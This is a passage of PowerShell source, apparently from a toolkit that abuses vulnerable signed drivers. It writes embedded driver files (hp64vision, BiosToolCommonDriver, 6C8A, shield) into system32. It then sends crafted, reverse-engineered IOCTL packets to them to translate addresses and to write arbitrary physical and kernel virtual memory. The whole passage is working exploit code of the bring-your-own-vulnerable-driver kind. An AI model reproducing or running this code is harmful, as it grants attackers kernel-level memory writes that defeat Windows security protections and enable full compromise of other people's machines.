        return [Bool]$NtApi::DeviceIoControl($hDevice, $Ioctl, $TxBuf, $BufSize, [IntPtr]::Zero, 0, [IntPtr]::Zero, [IntPtr]::Zero)
    } finally {
        if ($TxBuf)  { Free-IntPtr -handle $TxBuf -Method Auto }
        if ($hDevice) { Free-IntPtr -handle $hDevice -Method NtHandle }
    }
}
# hp64vision & CorMem
Function Write-PhysicalMemory {
    [CmdletBinding(DefaultParameterSetName = 'Int')]
    param (
        [IntPtr]$VA = [IntPtr]::Zero,
        [Int64]$PA = 0L,
        [Parameter(Mandatory = $true, ParameterSetName = 'Byte')]
        [Byte]$Byte,
        [Parameter(Mandatory = $true, ParameterSetName = 'Short')]
        [Int16]$Short,
        [Parameter(Mandatory = $true, ParameterSetName = 'Int')]
        [Int32]$Int,
        [Parameter(Mandatory = $true, ParameterSetName = 'Long')]
        [Int64]$Long
    )

    if (-not [File]::Exists("C:\windows\system32\BiosToolCommonDriver.sys")) {
        Import-EmbeddedBlock -BlockName BiosToolCommonDriver -OutPath 'C:\windows\system32\BiosToolCommonDriver.sys' | Out-Null
    }
    if (-not [File]::Exists("C:\windows\system32\hp64vision.sys")) {
        Import-EmbeddedBlock -BlockName hp64vision -OutPath 'C:\windows\system32\hp64vision.sys' | Out-Null
    }

    if ($PA -eq 0L) {
        # 1. ALWAYS translate the base VA to PA first using BiosToolCommonDriver
        $hDevice = Get-FileHandle -FileName BiosToolCommonDriver -AlternativeName BiosToolCommonDriver
        if ($null -eq $hDevice -or $hDevice -eq 0) { return Write-Error "Invalid handle [Translation]." }
        $TransInPtr = New-IntPtr -Size 16 -TypeSize ([IntPtr], [Int64]) -Values ($VA, 0L)
        if (-not $NtApi::DeviceIoControl($hDevice, 0x222034, $TransInPtr, 16, $TransInPtr, 16, [IntPtr]::Zero, [IntPtr]::Zero)) { 
            Free-IntPtr $TransInPtr ; Free-IntPtr $hDevice -Method NtHandle
            throw "IOCTL Translation Call failed." 
        }
        $Status = [Marshal]::ReadInt32($TransInPtr, 0)
        $PA = [Marshal]::ReadInt64($TransInPtr, 8)
        Free-IntPtr $TransInPtr ; Free-IntPtr $hDevice -Method NtHandle
        if ($Status -ne 0) { return Write-Error ("Translation failed with driver status: 0x{0:X}" -f $Status) }
    }

    # 2. Connect to the target manipulation engine
    $hVision = Get-FileHandle -FileName 'hp64vision' -AlternativeName 'hpvision0' -Symbolic 'Device'
    if ($null -eq $hVision -or $hVision -eq 0) { return Write-Error "Failed to obtain hp64vision handle." }

    try {
        # 3. Process 64-bit split logic purely via adjacent Physical Addresses (PA + 4)
        if ($PSCmdlet.ParameterSetName -eq 'Long') {
            $LongBytes = [System.BitConverter]::GetBytes($Long)
            $LowPart   = [System.BitConverter]::ToInt32($LongBytes, 0)
            $HighPart  = [System.BitConverter]::ToInt32($LongBytes, 4)

            # Write lower 4 bytes to base PA
            Send-RawPhysicalWrite -hDevice $hVision -PhysicalAddress $PA -Value $LowPart -Size 4
            # Write upper 4 bytes strictly to sequential PA + 4
            Send-RawPhysicalWrite -hDevice $hVision -PhysicalAddress ($PA + 4) -Value $HighPart -Size 4

            Write-Host "[+] Successfully performed 64-bit write sequence (PA + PA+4) to Coordinate $VA" -ForegroundColor Green
            return
        }

        # Process standard fixed widths
        switch ($PSCmdlet.ParameterSetName) {
            'Byte'  { [Int32]$DataValue = $Byte;   $AccessSize = 1 }
            'Short' { [Int32]$DataValue = $Short;  $AccessSize = 2 }
            'Int'   { [Int32]$DataValue = $Int;    $AccessSize = 4 }
        }
        Send-RawPhysicalWrite -hDevice $hVision -PhysicalAddress $PA -Value $DataValue -Size $AccessSize
        Write-Host "[+] Successfully processed write sequence to Coordinate $VA" -ForegroundColor Green
    } finally {
        if ($hVision) { Free-IntPtr $hVision -Method NtHandle }
    }
}
Function Send-RawPhysicalWrite {
    param($hDevice, [Int64]$PA, [Int32]$Value, [Int32]$Size)

    # Allocate exactly 16 bytes to satisfy the driver's strict buffer length filter
    $InBuf = [Marshal]::AllocHGlobal(16)
    try {
        # Extract the lower 32-bits of the address to match the *v4 dereference limitation
        $PhysBytes = [System.BitConverter]::GetBytes($PA)
        $CleanPhysAddr = [System.BitConverter]::ToInt32($PhysBytes, 0)

        # Build out the array matrix exactly as parsed by sub_12040
        [Marshal]::WriteInt32($InBuf, 0,  $CleanPhysAddr)  # v4[0] - Physical Address Index
        [Marshal]::WriteInt32($InBuf, 4,  $Value)          # v4[1] - Target Value Array Data
        [Marshal]::WriteInt32($InBuf, 8,  $Size)           # v4[2] - Operation Byte Width Selector
        [Marshal]::WriteInt32($InBuf, 12, 0)               # v4[3] - Trailing Padding to fill 16 bytes

        # Fire DeviceIoControl using 16 for both buffer parameters
        if (-not $NtApi::DeviceIoControl($hDevice, 2228396, $InBuf, 16, $InBuf, 16, [IntPtr]::Zero, [IntPtr]::Zero)) {
            throw "Physical write sequence rejected by driver engine structure."
        }
    } finally {
        if ($InBuf) { [Marshal]::FreeHGlobal($InBuf) }
    }
}
# Phoenix 6c8a & CorMem [VA<>PA]
# Restricted to Low-Memory Regions < 4GB
function Write-PhysicalAddress {
    [CmdletBinding(DefaultParameterSetName = 'RawBytes')]
    param (
        [IntPtr]$VA = [IntPtr]::Zero,
        [Int64]$PA = 0L,

        [Parameter(Mandatory = $true, ParameterSetName = 'RawBytes')]
        [Byte[]]$Value,

        [Parameter(Mandatory = $true, ParameterSetName = 'Byte')]
        [Byte]$Byte,

        [Parameter(Mandatory = $true, ParameterSetName = 'Short')]
        [Int16]$Short,

        [Parameter(Mandatory = $true, ParameterSetName = 'Int')]
        [Int32]$Int,

        [Parameter(Mandatory = $true, ParameterSetName = 'Long')]
        [Int64]$Long
    )

    if (-not [File]::Exists("C:\windows\system32\6C8A.sys")) {
        Import-EmbeddedBlock -BlockName 6C8A -OutPath 'C:\windows\system32\6C8A.sys' | Out-Null
    }

    if ($PA -eq 0L) {
        try {
            $hCorMem = Get-FileHandle -FileName CorMem
            if ($null -eq $hCorMem -or $hCorMem -eq 0) { 
                throw "Invalid handle." 
            }
            $TransInPtr = New-IntPtr -Size 8 -InitialValue $VA -UsePointerSize
            if (-not $NtApi::DeviceIoControl($hCorMem, 2236444, $TransInPtr, 8, $TransInPtr, 8, [IntPtr]::Zero, [IntPtr]::Zero)) { throw "Translation failed." }
            $PA = [Marshal]::ReadInt64($TransInPtr)
        } catch {
            # Do nothing
        }
        finally {
            Free-IntPtr $TransInPtr -Method Auto; 
            Free-IntPtr $hCorMem -Method NtHandle
        }
        if ($PA -eq 0) {
            try { $PA = Convert-VirtualToPhysical -VirtualAddress $VA } catch {}
        }
        if ($PA -eq 0) { 
            return Write-Error "Invalid physical address resolved."
        }
    }

    $hDevice = Get-FileHandle -FileName '6c8a' -AlternativeName 'TdkLib' -Symbolic 'Device'
    if ($null -eq $hDevice -or $hDevice -eq 0) { return Write-Error "Invalid handle." }

    Write-Host "Debug: Resolved Physical Address is: [0x$( $PA.ToString('X16') )]"

    # Convert dynamic types to raw bytes
    $RawValue = $null
    switch ($PSCmdlet.ParameterSetName) {
        'Byte'  { $RawValue = [Byte[]]@($Byte) }
        'Short' { $RawValue = [System.BitConverter]::GetBytes($Short) }
        'Int'   { $RawValue = [System.BitConverter]::GetBytes($Int) }
        'Long'  { $RawValue = [System.BitConverter]::GetBytes($Long) }
        Default { $RawValue = $Value }
    }

    $Size = $RawValue.Length

    try {
        $DataPtr    = New-IntPtr -Data $RawValue
        $TransInPtr = New-IntPtr -Size 8 -InitialValue $PA -UsePointerSize
        if (-not $NtApi::DeviceIoControl(
            $hDevice, 
            0x222186, 
            $TransInPtr,  # lpInBuffer  --> Holds the 8-byte Physical Address ($PA)
            8,            # nInBufferSize
            $DataPtr,     # lpOutBuffer --> Holds the raw payload data bytes to be written
            $Size,        # nOutBufferSize --> Dictates 'v7' (the length of the write loop)
            [IntPtr]::Zero, 
            [IntPtr]::Zero
        )) { 
            throw "IOCTL Call failed." 
        }

        return $true
    }
    finally {
        # Secure cleanup blocks
        if ($TransInPtr)       { New-IntPtr  -Release -hHandle $TransInPtr }
        if ($DataPtr)          { New-IntPtr  -Release -hHandle $DataPtr }
        if ($hDevice)          { Free-IntPtr -handle $hDevice -Method NtHandle }
    }
}
# shield.sys, shield-async.sys, shieldwp.sys
Function Write-VirtualAddress {
    [CmdletBinding(DefaultParameterSetName = 'RawBytes')]
    param (
        [IntPtr]$VA = [IntPtr]::Zero,

        [Parameter(Mandatory = $true, ParameterSetName = 'RawBytes')]
        [Byte[]]$Value,

        [Parameter(Mandatory = $true, ParameterSetName = 'Byte')]
        [Byte]$Byte,

        [Parameter(Mandatory = $true, ParameterSetName = 'Short')]
        [Int16]$Short,

        [Parameter(Mandatory = $true, ParameterSetName = 'Int')]
        [Int32]$Int,

        [Parameter(Mandatory = $true, ParameterSetName = 'Long')]
        [Int64]$Long
    )

    if (-not [File]::Exists("C:\windows\system32\shield.sys")) {
        Import-EmbeddedBlock -BlockName shield -OutPath 'C:\windows\system32\shield.sys' | Out-Null
    }

    $IOCTL = 0x96102014
    $Handle = Get-FileHandle -FileName 'shield' -AlternativeName 'EAZShield'
    if (-not $Handle) { throw "No handle to driver available." }

    $PacketSize = 0x450
    $DataPtr = New-IntPtr -Size $PacketSize

    try {
        # 2. Determine payload type and convert to temporary byte array
        $PayloadBytes = switch ($PSCmdlet.ParameterSetName) {
            'RawBytes' { $Value }
            'Byte'     { [Byte[]]@($Byte) }
            'Short'    { [System.BitConverter]::GetBytes($Short) }
            'Int'      { [System.BitConverter]::GetBytes($Int) }
            'Long'     { [System.BitConverter]::GetBytes($Long) }
        }

        $BlockSize = $PayloadBytes.Length

        # 3. Build Packet Layout matching sub_23908 expectations
        [Marshal]::WriteInt32($DataPtr, 0x00, $PacketSize)
        [Marshal]::WriteInt32($DataPtr, 0x04, 0x444D4377) # "wCMD"
        [Marshal]::WriteInt32($DataPtr, 0x08, 0xF0016)    # Sub-command Code
        [Marshal]::WriteInt16($DataPtr, 0x0A, 15)         # Routing Verification Index

        # KEY FIX: Operation set to 0 tells the driver's memmove to target the VA as destination
        [Marshal]::WriteByte($DataPtr, 0x40, 0)           
        
        [Marshal]::WriteInt32($DataPtr, 0x44, $BlockSize) 
        [Marshal]::WriteInt64($DataPtr, 0x48, $VA.ToInt64())

        # 4. Write payload bytes to the inline staging location (Offset 0x50)
        [Marshal]::Copy($PayloadBytes, 0, [IntPtr]::Add($DataPtr, 0x50), $BlockSize)

        # 5. Dispatch the IOCTL to execute the write operation
        $bytesReturned = New-IntPtr -Size 8
        if (-not $NtApi::DeviceIoControl($Handle, $IOCTL, $DataPtr, $PacketSize, $DataPtr, $PacketSize, $bytesReturned, [IntPtr]::Zero)) {
            throw "IOCTL Write failed"
        }

        return $true

        Write-Verbose ("Successfully wrote $BlockSize bytes to Virtual Address: 0x{0:X}" -f $VA.ToInt64())
    }
    finally { 
        Free-IntPtr -handle $DataPtr -Method Auto
        Free-IntPtr -handle $Handle -Method NtHandle 
    }
}
